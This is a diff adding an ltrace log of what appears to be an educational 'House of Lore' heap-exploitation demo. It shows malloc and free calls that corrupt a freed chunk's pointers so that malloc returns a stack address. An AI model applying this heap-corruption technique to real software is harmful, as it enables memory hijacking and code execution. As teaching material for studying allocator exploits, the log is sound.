@@ -1,0 +1,39 @@
+__libc_start_main(0x40074e, 1, 0x7fff96f70188, 0x400c00 <unfinished ...>
+fwrite("\nWelcome to the House of Lore\n", 1, 30, 0x7f57d6c80540)       = 30
+fwrite("This is a revisited version that"..., 1, 92, 0x7f57d6c80540)    = 92
+fwrite("This is tested against Ubuntu 14"..., 1, 60, 0x7f57d6c80540)    = 60
+fwrite("Allocating the victim chunk\n", 1, 28, 0x7f57d6c80540)          = 28
+malloc(100)                                                             = 0xa03010
+fprintf(0x7f57d6c80540, "Allocated the first small chunk "..., 0xa03010) = 56
+fprintf(0x7f57d6c80540, "stack_buffer_1 at %p\n", 0x7fff96f70070)       = 33
+fprintf(0x7f57d6c80540, "stack_buffer_2 at %p\n", 0x7fff96f70050)       = 33
+fwrite("Create a fake chunk on the stack"..., 1, 32, 0x7f57d6c80540)    = 32
+fwrite("Set the fwd pointer to the victi"..., 1, 166, 0x7f57d6c80540)   = 166
+fwrite("Set the bk pointer to stack_buff"..., 1, 224, 0x7f57d6c80540)   = 224
+fwrite("Allocating another large chunk i"..., 1, 113, 0x7f57d6c80540)   = 113
+malloc(1000)                                                            = 0xa03080
+fprintf(0x7f57d6c80540, "Allocated the large chunk on the"..., 0xa03080) = 50
+fprintf(0x7f57d6c80540, "Freeing the chunk %p, it will be"..., 0xa03010) = 68
+free(0xa03010)                                                          = <void>
+fwrite("\nIn the unsorted bin the victim'"..., 1, 62, 0x7f57d6c80540)   = 62
+fprintf(0x7f57d6c80540, "victim->fwd: %p\n", 0)                         = 19
+fprintf(0x7f57d6c80540, "victim->bk: %p\n\n", 0)                        = 19
+fwrite("Now performing a malloc that can"..., 1, 84, 0x7f57d6c80540)    = 84
+fprintf(0x7f57d6c80540, "This means that the chunk %p wil"..., 0xa03010) = 77
+malloc(1200)                                                            = 0xa03470
+fprintf(0x7f57d6c80540, "The chunk that can't be handled "..., 0xa03470) = 101
+fwrite("The victim chunk has been sorted"..., 1, 69, 0x7f57d6c80540)    = 69
+fprintf(0x7f57d6c80540, "victim->fwd: %p\n", 0x7f57d6c7fbd8)            = 28
+fprintf(0x7f57d6c80540, "victim->bk: %p\n\n", 0x7f57d6c7fbd8)           = 28
+fwrite("Now emulating a vulnerability th"..., 1, 72, 0x7f57d6c80540)    = 72
+fwrite("Now allocating a chunk with size"..., 1, 62, 0x7f57d6c80540)    = 62
+fwrite("This should return the overwritt"..., 1, 103, 0x7f57d6c80540)   = 103
+malloc(100)                                                             = 0xa03010
+fwrite("This last malloc should trick th"..., 1, 101, 0x7f57d6c80540)   = 101
+malloc(100)                                                             = 0x7fff96f70080
+fwrite("p4 = malloc(100)\n", 1, 17, 0x7f57d6c80540)                     = 17
+fprintf(0x7f57d6c80540, "\nThe fwd pointer of stack_buffer"..., 0x7f57d6c7fbd8) = 87
+fprintf(0x7f57d6c80540, "\np4 is %p and should be on the s"..., 0x7fff96f70080) = 50
+puts("Nice jump d00d")                                                  = 15
+exit(0 <no return ...>
++++ exited (status 0) +++
